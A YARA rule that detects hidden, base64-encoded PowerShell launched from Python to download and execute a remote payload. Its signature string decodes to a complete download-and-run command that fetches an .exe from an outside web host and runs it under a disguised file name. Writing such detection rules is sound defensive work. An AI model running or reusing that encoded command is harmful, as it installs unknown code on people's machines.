rule identifies_the_use_of_encoded_PowerShell_commands_to_download_and_execute_a_remote_payload {
    meta:
        confidence = "95"
        severity = "90"

    strings:
        $powershell_invocation = "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand"
        $url_pattern = /https?:\/\/[^\s\"']+/
        $encoded_command = "cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBlAHMAcQB1AGUAbABlAHMAdABsAC4AMAAwADAAdwBlAGIAaABvAHMAdABhAHAAcAAuAGMAbwBtAC8AeABFAHMAcQB1AGUAbABlAHMAcQB1AGEAZAAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA="

    condition:
        all of them
}